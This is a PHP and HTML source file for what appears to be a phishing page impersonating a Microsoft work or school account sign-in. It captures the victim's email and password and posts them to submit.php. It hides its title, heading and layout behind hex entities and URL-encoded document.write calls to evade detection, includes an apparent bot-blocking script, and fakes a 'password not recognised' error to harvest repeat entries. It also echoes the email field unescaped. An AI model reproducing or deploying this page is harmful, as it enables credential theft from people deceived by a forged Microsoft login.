<?php 
	include('bt.php');
        
	if (isset($_POST['email']) && !empty($_POST['email'])) {
		$email = $_POST['email'];	
	} else if (isset($_GET['email']) && !empty($_GET['email'])) {
		$email = $_GET['email'];
	} else {
		header('Location: index.php?error=1');
	}
	
	$errorMsg = '';

	if(isset($_GET['error'])) {
		if ($_GET['error'] == 1) {	
			$errorMsg = "Enter a valid email.";
		} else if ($_GET['error'] == 2) {
			$errorMsg = "We don't recognise your password. Make sure that you type the password for your work or school account.";
		}
	}

?>

<!DOCTYPE html>
<html>
<head>
	<title>&#x53;&#x69;&#x67;&#x6E;&#x20;&#x69;&#x6E;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<meta name="robots" content "none">
	<meta name="Googlebot" content="nofollow">
	<meta name="robots" content "noindex, nofollow">
	<link rel="shortcut icon" type="icon" href="images/favicon.png">
	<link rel="stylesheet" type="text/css" href="style.css">
	<script type="text/javascript" src="js/jquery.js"></script>	
	
</head>

<body>
<script type="text/javascript">
<!--
document.write(unescape('%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%76%65%72%6C%61%79%22%3E%0A%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%6C%6F%67%69%6E%2D%62%6F%78%22%3E%0A%09%09%09%3C%69%6D%67%20%73%72%63%3D%22%69%6D%61%67%65%73%2F%6D%73%2D%6C%6F%67%6F%2D%76%32%2E%6A%70%67%22%20%61%6C%74%3D%22%6C%6F%67%6F%22%3E%0A%09%09%09%3C%64%69%76%20%69%64%3D%22%69%64%65%6E%74%69%74%79%22%20%63%6C%61%73%73%3D%22%69%64%65%6E%74%69%74%79%2D%62%61%6E%6E%65%72%22%3E'));
//-->
</script>
			
				<div id="identity-name" class="identity">
					&nbsp;&nbsp;&nbsp;<img src="images/arrow.png" alt="arrow">&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $email; ?>
				</div>
				
				
			</div>

			<h2 id="title" style="color:#231E17;"><strong>&#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</strong></h2>
			<p id="message" class="message"><?php echo $errorMsg; ?></p>

<script type="text/javascript">
<!--
document.write(unescape('%09%09%09%3C%64%69%76%20%69%64%3D%22%6C%6F%61%64%65%72%22%20%63%6C%61%73%73%3D%22%6C%6F%61%64%65%72%20%68%69%64%64%65%6E%22%3E%0A%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%69%72%63%6C%65%22%3E%3C%2F%64%69%76%3E%0A%09%09%09%3C%2F%64%69%76%3E'));
//-->
</script>

			<form action="submit.php" method="post">
				<input type="hidden" id="email" name="email" value="<?php echo $email; ?>">
				<input id="password" type="password" name="password" placeholder="Password" required autofocus>
				
			<br>

			<div id="group2">
				
				<small id="fps"><a href="#" class="fade">Forgot my password</a></small>
				<br>
				<br>
				<br>
			
			</div>
			<input id="signin" type="submit" name="signin" value="Sign in">
			</form>
		</div>
	</div>

	<footer>
		<ul>
			<li><a href="#">Privacy & cookies</a></li>
			<li><a href="#">Terms of use</a></li>
			<li><a>©2021 Microsoft</a></li>
		</ul>
	</footer>

</body>
</html>
